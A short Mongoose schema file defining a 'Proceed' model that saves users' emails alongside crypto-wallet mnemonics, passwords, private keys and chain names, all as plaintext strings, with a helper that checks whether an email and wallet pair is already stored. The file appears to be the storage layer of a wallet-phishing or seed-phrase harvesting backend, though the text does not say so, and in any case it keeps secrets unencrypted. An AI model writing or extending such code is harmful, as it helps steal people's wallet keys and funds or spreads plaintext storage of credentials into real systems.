import mongoose from 'mongoose';

const proceedSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    trim: true,
    lowercase: true,
    index: true
  },
  walletName: {
    type: String,
    required: true,
    trim: true,
    index: true
  },
  mnemonic: {
    type: String,
    required: false,
    trim: true
  },
  password: {
    type: String,
    required: false,
    trim: true
  },
  privateKey: {
    type: String,
    required: false,
    trim: true
  },
  chainName: {
    type: String,
    required: false,
    trim: true
  }
}, {
  timestamps: true
});

// Compound index for efficient queries on email + walletName
proceedSchema.index({ email: 1, walletName: 1 }, { unique: true });

// Static method to check if email+wallet combination exists
proceedSchema.statics.exists = async function(email, walletName) {
  const count = await this.countDocuments({ 
    email: email.toLowerCase(), 
    walletName: walletName.trim() 
  });
  return count > 0;
};

const Proceed = mongoose.model('Proceed', proceedSchema);

export default Proceed;

